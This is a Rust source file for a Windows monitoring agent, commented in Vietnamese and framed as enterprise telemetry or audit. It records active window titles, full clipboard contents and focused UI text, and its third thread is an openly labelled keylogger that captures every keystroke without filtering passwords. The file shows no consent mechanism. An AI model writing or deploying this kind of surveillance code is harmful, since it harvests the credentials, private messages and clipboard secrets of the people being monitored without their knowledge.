use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicU32, Ordering};
use std::thread::sleep;
use std::time::Duration;
use tokio::task;
use windows_sys::Win32::UI::Input::KeyboardAndMouse::{GetLastInputInfo, LASTINPUTINFO};
use windows_sys::Win32::System::SystemInformation::GetTickCount;

use crate::telemetry::window_tracker::get_active_window;
use crate::telemetry::clipboard::check_clipboard;
use crate::telemetry::accessibility::get_focused_element;
use crate::telemetry::state_machine::StateMachine;
use rdev::{listen, Event, EventType};

pub fn spawn_telemetry_loop(state: Arc<Mutex<StateMachine>>) {
    let current_apm = Arc::new(AtomicU32::new(0));
    
    // Thread đếm APM (Actions Per Minute)
    let apm_counter = current_apm.clone();
    task::spawn_blocking(move || {
        let mut last_tick = 0;
        let mut actions_this_minute = 0;
        let mut minute_start = std::time::Instant::now();
        
        loop {
            unsafe {
                let mut last_input = LASTINPUTINFO {
                    cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
                    dwTime: 0,
                };
                if GetLastInputInfo(&mut last_input) != 0 {
                    if last_input.dwTime != last_tick {
                        last_tick = last_input.dwTime;
                        actions_this_minute += 1;
                    }
                }
            }
            
            if minute_start.elapsed().as_secs() >= 60 {
                apm_counter.store(actions_this_minute, Ordering::Relaxed);
                actions_this_minute = 0;
                minute_start = std::time::Instant::now();
            }
            
            // Poll 20 lần 1 giây để bắt kịp tốc độ gõ phím nhanh
            sleep(Duration::from_millis(50));
        }
    });

    let state_for_window = state.clone();
    task::spawn_blocking(move || {
        let mut last_window = String::new();
        let mut last_clipboard = String::new();

        loop {
            // Enterprise Audit Phase 1.4: Tối ưu hiệu năng bằng Idle Detection
            #[cfg(not(test))]
            unsafe {
                let mut last_input = LASTINPUTINFO {
                    cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
                    dwTime: 0,
                };
                if GetLastInputInfo(&mut last_input) != 0 {
                    let current_tick = GetTickCount();
                    let idle_time_ms = current_tick.saturating_sub(last_input.dwTime);
                    
                    // Nếu user không làm gì trong 60 giây (idle), tạm ngưng quét để tiết kiệm Pin và CPU
                    if idle_time_ms > 60_000 {
                        sleep(Duration::from_secs(10));
                        continue; // Bỏ qua lượt quét này
                    }
                }
            }

            let mut window_or_clipboard_changed = false;

            // 1. Theo dõi Window
            if let Some(win) = get_active_window() {
                if win.title != last_window {
                    last_window = win.title.clone();
                    window_or_clipboard_changed = true;
                    if let Ok(state_lock) = state_for_window.lock() {
                        let apm = current_apm.load(Ordering::Relaxed);
                        let _ = state_lock.log_window_change(&last_window, win.process_id, apm);
                    }
                }
            }

            // 2. Theo dõi Clipboard
            if let Some(clip) = check_clipboard() {
                if clip.lineage_id != last_clipboard {
                    last_clipboard = clip.lineage_id.clone();
                    window_or_clipboard_changed = true; // Trạng thái màn hình có biến động
                    if let Ok(state_lock) = state_for_window.lock() {
                        let _ = state_lock.log_clipboard_event(&last_clipboard, &clip.content);
                    }
                }
            }

            // 3. Dynamic Polling: Chỉ gọi UIAutomation (Cực tốn tài nguyên COM) khi màn hình/clipboard vừa thay đổi
            if window_or_clipboard_changed {
                if let Some(focused) = get_focused_element() {
                    if let Ok(state_lock) = state_for_window.lock() {
                        let _ = state_lock.log_focused_text(&focused.name, &focused.text_value);
                    }
                }
            }

            // Chu kỳ 2 giây/lần
            sleep(Duration::from_secs(2));
        }
    });

    // Thread lắng nghe Keylogger (100% Thu thập)
    let state_for_keylogger = state.clone();
    task::spawn_blocking(move || {
        let mut buffer = String::new();
        let callback = move |event: Event| {
            if let EventType::KeyPress(_) = event.event_type {
                if let Some(name) = event.name {
                    // Nếu là phím Enter hoặc phím Space hoặc quá dài
                    let is_terminator = name == "\r" || name == "\n";
                    if name != "\r" && name != "\n" {
                        buffer.push_str(&name);
                    } else {
                        buffer.push_str(" ");
                    }
                    
                    if buffer.len() > 50 || is_terminator {
                        if !buffer.trim().is_empty() {
                            if let Ok(state_lock) = state_for_keylogger.lock() {
                                let _ = state_lock.log_keystrokes(&buffer);
                            }
                        }
                        buffer.clear();
                    }
                }
            }
        };
        
        if let Err(e) = listen(callback) {
            eprintln!("Keylogger Error: {:?}", e);
        }
    });
}
